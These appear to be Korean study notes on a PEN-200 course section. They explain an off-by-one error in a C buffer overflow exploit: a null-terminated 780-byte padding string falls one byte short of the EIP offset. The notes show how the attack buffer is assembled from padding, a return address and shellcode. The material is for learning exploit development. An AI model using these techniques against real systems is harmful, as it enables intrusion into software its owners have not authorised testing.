# 14.1.5 오버플로 버퍼 조정

> **Changing the Overflow Buffer** · PEN-200 §14.1.5

- 오프셋이 1바이트 어긋난 원인을 추적함. "A" 로 채우는 패딩 버퍼의 앞부분을 보면 크기 780 으로 `malloc` 을 호출함.

```
int initial_buffer_size = 780;
char *padding = malloc(initial_buffer_size);
```

- 780 은 앞서 본 값 — 스택의 리턴 주소를 덮고 EIP 를 장악하는 데 필요한 오프셋 바이트 수임.
- `malloc` 은 요청한 크기의 메모리 블록을 잡아줄 뿐이라 초기화가 따로 필요함. 바로 뒤 `memset` 이 그 할당을 `0x41`(ASCII "A" 의 hex)로 채움.

```
memset(padding, 0x41, initial_buffer_size);
```

- 그다음 줄이 문제의 지점임 — 또 한 번의 `memset` 이 할당의 «마지막 1바이트»를 널 바이트로 만듦.

```
memset(padding + initial_buffer_size - 1, 0x00, 1);
```

- 처음에는 이유가 안 보이지만, 최종 버퍼를 만드는 부분까지 읽으면 드러남.

```
char *buffer = malloc(buffer_length);
memset(buffer, 0x00, buffer_length);
strcpy(buffer, request_one);
strcat(buffer, content_length_string);
strcat(buffer, request_two);
strcat(buffer, padding);
strcat(buffer, retn);
strcat(buffer, shellcode);
strcat(buffer, request_three);
```

*조각들을 이어붙여 최종 공격 버퍼를 구성 (원문 Listing 314)*

- 흐름은 이러함 — `malloc` 으로 버퍼용 char 배열을 잡고 널 바이트로 채운 뒤, `strcpy`·`strcat` 같은 문자열 함수로 각 변수의 내용을 차례로 이어붙임.
- **최종 버퍼가 「문자열」로 구성된다는 점이 핵심임.** C 는 널 종료 문자열을 쓰므로 `strcpy`·`strcat` 은 대상 char 배열에서 처음 나오는 널 바이트를 문자열의 끝이자 길이로 판단함.
- 그래서 780바이트로 잡은 패딩의 마지막 바이트를 `0x00` 으로 만들면, 실제로 이어붙는 "A" 문자열은 **779바이트**가 됨. EIP 가 한 바이트 밀려 덮인 이유가 바로 이것임.
- 해결은 `initial_buffer_size` 를 1 늘리는 것뿐임.

```
    int initial_buffer_size = 781;
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
```
